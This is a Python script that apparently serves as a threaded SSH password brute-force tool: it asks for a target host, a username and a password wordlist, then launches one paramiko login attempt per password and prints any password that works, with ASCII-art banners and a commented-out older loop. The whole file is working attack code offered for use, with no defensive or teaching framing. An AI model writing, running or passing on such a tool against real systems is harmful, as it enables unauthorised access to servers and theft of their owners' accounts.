import paramiko, sys, os, termcolor
import threading,time

stop_flag = 0
banner = """


         _nnnn_                      
        dGGGGMMb     ,"""""""""""""".
       @p~qp~~qMb    | sk2gsrå.ape! |
       M|@||@) M|   _;..............'
       @,----.JM| -'
      JS^\__/  qKL
     dZP        qKRb
    dZP          qKKb
   fZP            SMMb
   HZM            MMMM
   FqM            MMMM
 __| ".        |\dS"qML
 |    `.       | `' \Zq
_)      \.___.,|     .'
\____   )MMMMMM|   .'
     `-'       `--' hjm


"""

banner2 = """

   _______________                        |*\_/*|________
  |  ___________  |     .-.     .-.      ||_/-\_|______  |
  | |           | |    .****. .****.     | |           | |
  | |   0   0   | |    .*****.*****.     | |   0   0   | |
  | |     -     | |     .*********.      | |     -     | |
  | |   \___/   | |      .*******.       | |   \___/   | |
  | |___     ___| |       .*****.        | |___________| |
  |_____|\_/|_____|        .***.         |_______________|
    _|__|/ \|_|_.............*.............._|________|_
   / ********** \                          / ********** \
 /  ************  \                      /  ************  \
--------------------                    --------------------


"""
def ssh_connect(password):
    
    global stop_flag

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:

        ssh.connect(host, port=22,username=username,password=password)
        stop_flag = 1
        print(termcolor.colored(('[+] Found Password: '+ password+ " Account: "+ username),'green'))

    #except paramiko.AuthenticationException:
    except:
        print(termcolor.colored(('[-] Incorrect Login: '+ password+ " Account: "+ username),'red'))
        #code = 1
    
    #except socket.error as e:

        #code = 2

    ssh.close()
    #return code


print(banner)
host = input('[+] Target Address: ')
print('******            !')
username = input('[+] SSH username: ')
print('************      !')
input_file = input('[+] Password File: ')
print("******************!")
print('\n')
print(banner2)
print('\n')
if os.path.exists(input_file) == False:

    print("[!!] That file-path doesn't exists ")
    sys.exit(1)

print("00100 Starting Threaded SSH Bruteforce on "+host+ " With account "+username+" 00100")

# with open(input_file,"r") as file: 
#     for line in file.readlines():
#         password = line.strip()
#         try:
#             response = ssh_connect(password)
#             if response == 0:
#                 print(termcolor.colored(('[+] Found Password: '+ password + ' , for account: '+ username), 'green'))
#                 break
#             elif response == 1:
#                 print('[-] Incorrect ^_0 Login: '+ password)
#             elif response == 2:
#                 print('[!!] Can"t connect')
#                 sys.exit(1)
#             else:
#                 print('[!!] Sorry there is no way to run this program please check all answers and try again')

            
#         except Exception as e:
#             print(e)
#             pass

with open(input_file,"r") as file:

    for line in file.readlines():

        if stop_flag == 1: 

            t.join()
            exit()

        password = line.strip()

        t = threading.Thread(target = ssh_connect, args = (password,))
        t.start()
        time.sleep(0.6)
